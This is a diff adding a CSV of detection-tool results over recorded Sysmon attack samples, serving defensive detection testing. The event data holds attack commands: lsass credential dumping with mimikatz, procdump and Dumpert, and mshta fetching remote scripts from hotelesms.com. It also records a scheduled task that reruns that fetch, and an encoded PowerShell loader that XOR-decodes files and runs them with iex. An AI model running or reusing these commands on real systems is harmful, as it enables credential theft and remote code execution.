@@ -1,0 +1,492 @@
+timestamp,detections,path,count,Event.System.Provider,Event ID,Record ID,Computer,Event Data
+2019-03-17T19:09:41.328868+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_11_lsass_memdump.evtx,1,Microsoft-Windows-Sysmon,10,4434,PC04.example.corp,"TargetProcessId: 476
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 980
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: 365ABB72-9B75-5C8E-0000-0010013F1200
+SourceProcessId: 1856
+TargetProcessGUID: 365ABB72-0886-5C8F-0000-001030560000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+4595c|C:\Windows\SYSTEM32\ntdll.dll+1d4da|C:\Windows\system32\kernel32.dll+3cc47|C:\Windows\system32\kernel32.dll+3ff99|C:\Windows\system32\dbghelp.dll+4c791|C:\Windows\system32\dbghelp.dll+4dcab|C:\Windows\system32\dbghelp.dll+4a1b8|C:\Windows\system32\dbghelp.dll+45b81|C:\Windows\system32\dbghelp.dll+45e2a|C:\Users\IEUser\Desktop\procdump.exe+11a8d|C:\Users\IEUser\Desktop\procdump.exe+116a6|C:\Users\IEUser\Desktop\procdump.exe+11610|C:\Users\IEUser\Desktop\procdump.exe+11356|C:\Windows\system32\kernel32.dll+4ef8c|C:\Windows\SYSTEM32\ntdll.dll+6367a|C:\Windows\SYSTEM32\ntdll.dll+6364d
+UtcTime: 2019-03-17 19:09:41.328
+SourceImage: C:\Users\IEUser\Desktop\procdump.exe
+"
+2019-03-17T19:10:03.991455+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_11_lsass_memdump.evtx,1,Microsoft-Windows-Sysmon,10,4442,PC04.example.corp,"TargetProcessId: 476
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3620
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: 365ABB72-9B85-5C8E-0000-0010C4CC1200
+SourceProcessId: 3576
+TargetProcessGUID: 365ABB72-0886-5C8F-0000-001030560000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+4595c|C:\Windows\SYSTEM32\ntdll.dll+1d4da|C:\Windows\system32\kernel32.dll+3cc47|C:\Windows\system32\kernel32.dll+3ff99|C:\Windows\system32\dbghelp.dll+4c791|C:\Windows\system32\dbghelp.dll+4dcab|C:\Windows\system32\dbghelp.dll+4a1b8|C:\Windows\system32\dbghelp.dll+45b81|C:\Windows\system32\dbghelp.dll+45e2a|C:\Windows\system32\taskmgr.exe+1360e|C:\Windows\system32\kernel32.dll+4ef8c|C:\Windows\SYSTEM32\ntdll.dll+6367a|C:\Windows\SYSTEM32\ntdll.dll+6364d
+UtcTime: 2019-03-17 19:10:02.068
+SourceImage: C:\Windows\system32\taskmgr.exe
+"
+2019-03-17T19:37:11.661930+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_lsass_mimikatz_sekurlsa_logonpasswords.evtx,1,Microsoft-Windows-Sysmon,10,4807,PC04.example.corp,"TargetProcessId: 476
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 2272
+RuleName: ''
+GrantedAccess: '0x1010'
+SourceProcessGUID: 365ABB72-A1E3-5C8E-0000-0010CEF72200
+SourceProcessId: 3588
+TargetProcessGUID: 365ABB72-0886-5C8F-0000-001030560000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+4595c|C:\Windows\system32\KERNELBASE.dll+8185|C:\Users\IEUser\Desktop\mimikatz_trunk\Win32\mimikatz.exe+5c5a9|C:\Users\IEUser\Desktop\mimikatz_trunk\Win32\mimikatz.exe+5c86c|C:\Users\IEUser\Desktop\mimikatz_trunk\Win32\mimikatz.exe+5cbd2|C:\Users\IEUser\Desktop\mimikatz_trunk\Win32\mimikatz.exe+5c4ff|C:\Users\IEUser\Desktop\mimikatz_trunk\Win32\mimikatz.exe+3b3d3
+UtcTime: 2019-03-17 19:37:11.641
+SourceImage: C:\Users\IEUser\Desktop\mimikatz_trunk\Win32\mimikatz.exe
+"
+2019-04-18T16:58:14.811881+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,10,22,IEWIN7,"TargetProcessId: 472
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3096
+RuleName: technique_id=T1003,technique_name=Credential Dumping
+GrantedAccess: '0x1010'
+SourceProcessGUID: 365ABB72-AC28-5CB8-0000-0010F3F70700
+SourceProcessId: 1200
+TargetProcessGUID: 365ABB72-29B3-5CB9-0000-001087490000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+4595c|C:\Windows\system32\KERNELBASE.dll+8185
+UtcTime: 2019-04-18 16:58:14.801
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+"
+2019-04-18T17:01:35.720774+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,10,30,IEWIN7,"TargetProcessId: 472
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3996
+RuleName: technique_id=T1003,technique_name=Credential Dumping
+GrantedAccess: '0x1010'
+SourceProcessGUID: 365ABB72-AC28-5CB8-0000-0010F3F70700
+SourceProcessId: 1200
+TargetProcessGUID: 365ABB72-29B3-5CB9-0000-001087490000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+4595c|C:\Windows\system32\KERNELBASE.dll+8185
+UtcTime: 2019-04-18 17:01:35.680
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+"
+2019-04-30T07:23:00.899263+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Discovery/discovery_meterpreter_ps_cmd_process_listing_sysmon_10.evtx,1,Microsoft-Windows-Sysmon,10,8341,IEWIN7,"TargetProcessId: 492
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 1088
+RuleName: ''
+GrantedAccess: '0x1410'
+SourceProcessGUID: 365ABB72-F7C9-5CC7-0000-0010BF010E00
+SourceProcessId: 3772
+TargetProcessGUID: 365ABB72-F6A1-5CC7-0000-001072590000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+4595c|C:\Windows\system32\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\Windows\system32\kernel32.dll+4ef8c|C:\Windows\SYSTEM32\ntdll.dll+6367a|C:\Windows\SYSTEM32\ntdll.dll+6364d
+UtcTime: 2019-04-30 07:23:00.883
+SourceImage: D:\m.exe
+"
+2019-05-02T14:50:17.955524+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_3_10_Invoke-Mimikatz_hosted_Github.evtx,1,Microsoft-Windows-Sysmon,10,10273,IEWIN7,"TargetProcessId: 484
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3204
+RuleName: ''
+GrantedAccess: '0x143a'
+SourceProcessGUID: 365ABB72-0244-5CCB-0000-00109AE70B00
+SourceProcessId: 1508
+TargetProcessGUID: 365ABB72-8077-5CCB-0000-0010F2590000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+4595c|C:\Windows\system32\KERNELBASE.dll+8185
+UtcTime: 2019-05-02 14:49:37.100
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+"
+2019-05-11T17:58:54.762534+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Persistence/sysmon_20_21_1_CommandLineEventConsumer.evtx,1,Microsoft-Windows-Sysmon,10,16118,IEWIN7,"TargetProcessId: 492
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 2796
+RuleName: ''
+GrantedAccess: '0x1410'
+SourceProcessGUID: 365ABB72-0D3E-5CD7-0000-0010680E1600
+SourceProcessId: 1832
+TargetProcessGUID: 365ABB72-8693-5CD7-0000-0010765E0000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+4591c|C:\Windows\system32\KERNELBASE.dll+8185|c:\python27\DLLs\_ctypes.pyd+ed6a|c:\python27\DLLs\_ctypes.pyd+d9d6|c:\python27\DLLs\_ctypes.pyd+999e|c:\python27\DLLs\_ctypes.pyd+a1ce|c:\python27\DLLs\_ctypes.pyd+5b71|C:\Windows\system32\python27.dll+8f14c|C:\Windows\system32\python27.dll+113384|C:\Windows\system32\python27.dll+112f24|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12
+UtcTime: 2019-05-11 17:58:54.762
+SourceImage: c:\python27\python.exe
+"
+2019-05-12T00:32:30.211387+00:00,Scheduled Task Created via Command Line,../EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_1_11_exec_as_system_via_schedtask.evtx,1,Microsoft-Windows-Sysmon,1,16243,IEWIN7,"Image: C:\Windows\System32\schtasks.exe
+RuleName: ''
+Description: Manages scheduled tasks
+TerminalSessionId: 1
+ParentCommandLine: python  winpwnage.py -u elevate -i 4 -p c:\Windows\System32\cmd.exe
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+ParentProcessId: 2740
+LogonGuid: 365ABB72-5DEC-5CD7-0000-00204A380100
+Hashes: SHA1=8A7E8B05A122B768AB85466B2A3DAF7A358F90F4,MD5=2003E9B15E1C502B146DAD2E383AC1E3,SHA256=15018D0093BEFABBA8B927743191030D1F8C17BB97FDB48C2FC3EAB20E2D4B3D,IMPHASH=D92C80D49382091310FB8DB089F856A9
+ParentProcessGuid: 365ABB72-6998-5CD7-0000-00104E422200
+ProcessId: 3876
+CurrentDirectory: c:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\
+ProcessGuid: 365ABB72-699E-5CD7-0000-001073582200
+CommandLine: '""C:\Windows\System32\schtasks.exe"" /create /xml c:\users\ieuser\appdata\local\temp\elevator.xml /tn elevator'
+FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
+User: IEWIN7\IEUser
+LogonId: '0x1384a'
+IntegrityLevel: High
+ParentImage: C:\Python27\python.exe
+UtcTime: 2019-05-12 00:32:30.023
+"
+2019-05-21T15:32:59.769825+00:00,Scheduled Task Created via Command Line,../EVTX-ATTACK-SAMPLES/Execution/exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx,1,Microsoft-Windows-Sysmon,1,4129,IEWIN7,"Image: C:\Windows\System32\schtasks.exe
+RuleName: ''
+Description: Manages scheduled tasks
+TerminalSessionId: 1
+ParentCommandLine: '""C:\Windows\System32\mshta.exe"" https://hotelesms.com/talsk.txt'
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+ParentProcessId: 2432
+LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
+Hashes: SHA1=8A7E8B05A122B768AB85466B2A3DAF7A358F90F4,MD5=2003E9B15E1C502B146DAD2E383AC1E3,SHA256=15018D0093BEFABBA8B927743191030D1F8C17BB97FDB48C2FC3EAB20E2D4B3D,IMPHASH=D92C80D49382091310FB8DB089F856A9
+ParentProcessGuid: 365ABB72-1A29-5CE4-0000-001079F92101
+ProcessId: 3772
+CurrentDirectory: C:\Users\IEUser\Desktop\
+ProcessGuid: 365ABB72-1A2B-5CE4-0000-00102F502201
+CommandLine: '""C:\Windows\System32\schtasks.exe"" /Create /sc MINUTE /MO 60 /TN MSOFFICE_ /TR ""mshta.exe https://hotelesms.com/Injection.txt"" /F '
+FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
+User: IEWIN7\IEUser
+LogonId: '0xc796'
+IntegrityLevel: High
+ParentImage: C:\Windows\System32\mshta.exe
+UtcTime: 2019-05-21 15:32:59.729
+"
+2019-05-27T01:28:42.711005+00:00,Encoded PowerShell Command Line,../EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5875,IEWIN7,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+RuleName: ''
+Description: Windows PowerShell
+TerminalSessionId: 0
+ParentCommandLine: c:\windows\system32\inetsrv\w3wp.exe -ap ""DefaultAppPool"" -v ""v2.0"" -l ""webengine4.dll"" -a \\.\pipe\iisipm7486e07c-453c-4f8e-85c6-8c8e3be98cd5 -h ""C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config"" -w """" -m 0 -t 20
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+ParentProcessId: 748
+LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
+Hashes: SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C
+ParentProcessGuid: 365ABB72-3251-5CEB-0000-00109E06E100
+ProcessId: 2584
+CurrentDirectory: C:\Windows\Temp\
+ProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
+CommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
+FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
+User: IIS APPPOOL\DefaultAppPool
+LogonId: '0x82423'
+IntegrityLevel: High
+ParentImage: C:\Windows\System32\inetsrv\w3wp.exe
+UtcTime: 2019-05-27 01:28:42.700
+"
+2019-05-27T15:12:59.578070+00:00,Scheduled Task Created via Command Line,../EVTX-ATTACK-SAMPLES/Execution/sysmon_exec_from_vss_persistence.evtx,1,Microsoft-Windows-Sysmon,1,6195,IEWIN7,"Image: C:\Windows\System32\schtasks.exe
+RuleName: Persistence - Scheduled Task Management
+Description: Manages scheduled tasks
+TerminalSessionId: 0
+ParentCommandLine: 'cmd.exe /c %SYSTEMROOT%\system32\schtasks.exe /create /sc minute /mo 1 /tn ""eyNQLDvUSuvVPg"" /tr ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\\Windows\Temp\svhost64.exe"" '
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+ParentProcessId: 4012
+LogonGuid: 365ABB72-7B40-5CEC-0000-0020E7030000
+Hashes: SHA1=8A7E8B05A122B768AB85466B2A3DAF7A358F90F4,MD5=2003E9B15E1C502B146DAD2E383AC1E3,SHA256=15018D0093BEFABBA8B927743191030D1F8C17BB97FDB48C2FC3EAB20E2D4B3D,IMPHASH=D92C80D49382091310FB8DB089F856A9
+ParentProcessGuid: 365ABB72-FE7B-5CEB-0000-0010867F0C00
+ProcessId: 4044
+CurrentDirectory: C:\Windows\system32\
+ProcessGuid: 365ABB72-FE7B-5CEB-0000-0010D6820C00
+CommandLine: 'C:\Windows\system32\schtasks.exe  /create /sc minute /mo 1 /tn ""eyNQLDvUSuvVPg"" /tr ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\\Windows\Temp\svhost64.exe"" '
+FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
+User: NT AUTHORITY\SYSTEM
+LogonId: '0x3e7'
+IntegrityLevel: System
+ParentImage: C:\Windows\System32\cmd.exe
+UtcTime: 2019-05-27 15:12:59.558
+"
+2019-06-21T07:35:37.329185+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx,1,Microsoft-Windows-Sysmon,10,238374,alice.insecurebank.local,"TargetProcessId: 520
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3532
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: ECAD0485-88C9-5D0C-0000-0010348C1D00
+SourceProcessId: 3572
+TargetProcessGUID: ECAD0485-822F-5D0C-0000-0010635E0000
+CallTrace: C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe+134da|C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe+12e6d|C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe+13f09|C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe+13dae|C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe+13c6e|C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe+13f99|C:\Windows\system32\KERNEL32.DLL+13d2|C:\Windows\SYSTEM32\ntdll.dll+154f4
+UtcTime: 2019-06-21 07:35:37.316
+SourceImage: C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe
+"
+2019-06-21T07:35:37.377199+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx,1,Microsoft-Windows-Sysmon,10,238376,alice.insecurebank.local,"TargetProcessId: 520
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3532
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: ECAD0485-88C9-5D0C-0000-0010348C1D00
+SourceProcessId: 3572
+TargetProcessGUID: ECAD0485-822F-5D0C-0000-0010635E0000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+909ba|C:\Windows\system32\ctiuser.dll+1b132|C:\Windows\SYSTEM32\ntdll.dll+80498|C:\Windows\system32\KERNEL32.DLL+1e1d4|C:\Windows\system32\KERNEL32.DLL+1dc17|C:\Windows\system32\ctiuser.dll+141be|C:\Windows\SYSTEM32\dbghelp.dll+1244d8|C:\Windows\SYSTEM32\dbghelp.dll+11ebd5|C:\Windows\SYSTEM32\dbghelp.dll+118402|C:\Windows\SYSTEM32\dbghelp.dll+1137e2|C:\Windows\SYSTEM32\dbghelp.dll+113c84|C:\Windows\system32\ctiuser.dll+22232|C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe+130a5|C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe+13f09|C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe+13dae|C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe+13c6e|C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe+13f99|C:\Windows\system32\KERNEL32.DLL+13d2|C:\Windows\SYSTEM32\ntdll.dll+154f4
+UtcTime: 2019-06-21 07:35:37.377
+SourceImage: C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe
+"
+2019-06-21T07:35:50.259077+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx,1,Microsoft-Windows-Sysmon,10,238379,alice.insecurebank.local,"TargetProcessId: 520
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3808
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: ECAD0485-88D6-5D0C-0000-001007AA1D00
+SourceProcessId: 1568
+TargetProcessGUID: ECAD0485-822F-5D0C-0000-0010635E0000
+CallTrace: C:\Users\administrator\Desktop\x64\Outflank-Dumpert-DLL.dll+12d1a|C:\Users\administrator\Desktop\x64\Outflank-Dumpert-DLL.dll+11c1f|C:\Users\administrator\Desktop\x64\Outflank-Dumpert-DLL.dll+1187b|C:\Users\administrator\Desktop\x64\Outflank-Dumpert-DLL.dll+136f8|C:\Users\administrator\Desktop\x64\Outflank-Dumpert-DLL.dll+138d1|C:\Windows\SYSTEM32\ntdll.dll+1c114|C:\Windows\SYSTEM32\ntdll.dll+1b88e|C:\Windows\SYSTEM32\ntdll.dll+1b684|C:\Windows\SYSTEM32\ntdll.dll+19cab|C:\Windows\SYSTEM32\ntdll.dll+2b3ef|C:\Windows\SYSTEM32\ntdll.dll+68df9|C:\Windows\system32\KERNELBASE.dll+858a|C:\Windows\system32\ctiuser.dll+15adb|C:\Windows\system32\rundll32.exe+21fa|C:\Windows\system32\rundll32.exe+2647|C:\Windows\system32\rundll32.exe+44c4|C:\Windows\system32\KERNEL32.DLL+13d2|C:\Windows\SYSTEM32\ntdll.dll+154f4
+UtcTime: 2019-06-21 07:35:50.254
+SourceImage: C:\Windows\system32\rundll32.exe
+"
+2019-06-21T07:35:50.264108+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx,1,Microsoft-Windows-Sysmon,10,238381,alice.insecurebank.local,"TargetProcessId: 520
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3808
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: ECAD0485-88D6-5D0C-0000-001007AA1D00
+SourceProcessId: 1568
+TargetProcessGUID: ECAD0485-822F-5D0C-0000-0010635E0000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+909ba|C:\Windows\system32\ctiuser.dll+1b132|C:\Windows\SYSTEM32\ntdll.dll+80498|C:\Windows\system32\KERNEL32.DLL+1e1d4|C:\Windows\system32\KERNEL32.DLL+1dc17|C:\Windows\system32\ctiuser.dll+141be|C:\Windows\SYSTEM32\dbghelp.dll+1244d8|C:\Windows\SYSTEM32\dbghelp.dll+11ebd5|C:\Windows\SYSTEM32\dbghelp.dll+118402|C:\Windows\SYSTEM32\dbghelp.dll+1137e2|C:\Windows\SYSTEM32\dbghelp.dll+113c84|C:\Windows\system32\ctiuser.dll+22232|C:\Users\administrator\Desktop\x64\Outflank-Dumpert-DLL.dll+11df1|C:\Users\administrator\Desktop\x64\Outflank-Dumpert-DLL.dll+1187b|C:\Users\administrator\Desktop\x64\Outflank-Dumpert-DLL.dll+136f8|C:\Users\administrator\Desktop\x64\Outflank-Dumpert-DLL.dll+138d1|C:\Windows\SYSTEM32\ntdll.dll+1c114|C:\Windows\SYSTEM32\ntdll.dll+1b88e|C:\Windows\SYSTEM32\ntdll.dll+1b684|C:\Windows\SYSTEM32\ntdll.dll+19cab|C:\Windows\SYSTEM32\ntdll.dll+2b3ef|C:\Windows\SYSTEM32\ntdll.dll+68df9|C:\Windows\system32\KERNELBASE.dll+858a|C:\Windows\system32\ctiuser.dll+15adb
+UtcTime: 2019-06-21 07:35:50.263
+SourceImage: C:\Windows\system32\rundll32.exe
+"
+2019-06-21T07:35:50.729226+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx,1,Microsoft-Windows-Sysmon,10,238382,alice.insecurebank.local,"TargetProcessId: 520
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3808
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: ECAD0485-88D6-5D0C-0000-001007AA1D00
+SourceProcessId: 1568
+TargetProcessGUID: ECAD0485-822F-5D0C-0000-0010635E0000
+CallTrace: C:\Users\administrator\Desktop\x64\Outflank-Dumpert-DLL.dll+12d1a|C:\Users\administrator\Desktop\x64\Outflank-Dumpert-DLL.dll+11c1f|C:\Windows\system32\rundll32.exe+2709|C:\Windows\system32\rundll32.exe+44c4|C:\Windows\system32\KERNEL32.DLL+13d2|C:\Windows\SYSTEM32\ntdll.dll+154f4
+UtcTime: 2019-06-21 07:35:50.724
+SourceImage: C:\Windows\system32\rundll32.exe
+"
+2019-06-21T07:35:50.749238+00:00,Suspicious LSASS Memory Access,../EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx,1,Microsoft-Windows-Sysmon,10,238384,alice.insecurebank.local,"TargetProcessId: 520
+TargetImage: C:\Windows\system32\lsass.exe
+SourceThreadId: 3808
+RuleName: ''
+GrantedAccess: '0x1fffff'
+SourceProcessGUID: ECAD0485-88D6-5D0C-0000-001007AA1D00
+SourceProcessId: 1568
+TargetProcessGUID: ECAD0485-822F-5D0C-0000-0010635E0000
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+909ba|C:\Windows\system32\ctiuser.dll+1b132|C:\Windows\SYSTEM32\ntdll.dll+80498|C:\Windows\system32\KERNEL32.DLL+1e1d4|C:\Windows\system32\KERNEL32.DLL+1dc17|C:\Windows\system32\ctiuser.dll+141be|C:\Windows\SYSTEM32\dbghelp.dll+1244d8|C:\Windows\SYSTEM32\dbghelp.dll+11ebd5|C:\Windows\SYSTEM32\dbghelp.dll+118402|C:\Windows\SYSTEM32\dbghelp.dll+1137e2|C:\Windows\SYSTEM32\dbghelp.dll+113c84|C:\Windows\system32\ctiuser.dll+22232|C:\Users\administrator\Desktop\x64\Outflank-Dumpert-DLL.dll+11df1|C:\Windows\system32\rundll32.exe+2709|C:\Windows\system32\rundll32.exe+44c4|C:\Windows\system32\KERNEL32.DLL+13d2|C:\Windows\SYSTEM32\ntdll.dll+154f4
